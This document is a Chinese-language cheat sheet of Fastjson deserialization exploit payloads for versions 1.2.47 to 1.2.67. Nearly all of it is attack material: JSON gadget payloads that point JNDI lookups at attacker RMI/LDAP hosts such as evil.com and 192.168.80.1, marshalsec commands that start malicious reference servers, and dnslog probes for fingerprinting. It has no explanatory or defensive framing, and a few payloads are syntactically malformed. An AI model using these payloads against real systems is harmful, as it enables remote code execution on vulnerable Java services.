## fastjson_1.2.47_反序列化漏洞

#### payload

	{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    	},
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    	}
	}

#### 其它公开payload
	{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit",""autoCommit":true}

	{"@type":"LLcom.sun.rowset.RowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true} 1.2.42

	{"@type":"[com.sun.rowset.RowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true} 1.2.25v1.2.43

	{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties"："data_source":"rmi://localhost:1099/Exploit"}} 1.2.25

	{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}

	{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"}1.2.60

	{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"} 1.2.60

	{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"} 1.2.61

	{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"rmi://localhost:1099/Exploit\"}  1.2.62

	{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"rmi://localhost:1099/Exploit\"} AnterosDBCPConfig

	{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://localhost:1099/Exploit\"} AnterosDBCPConfig

	{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\":{\"UserTransaction\":\"rmi://localhost:1099/Exploit\"}} JtaTransactionConfig


#### 1.2.66版本
	1. LDAP 方式
		java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Calc
	2. RMI 方式
		java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8000/#Calc
		
	payload
	{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
	{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
	{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
	{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}


#### 1.2.67通过dnslog判断fastjson
	{"@type":"java.net.Inet4Address","val":"dnslog"}
	{"@type":"java.net.Inet6Address","val":"dnslog"}
	{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
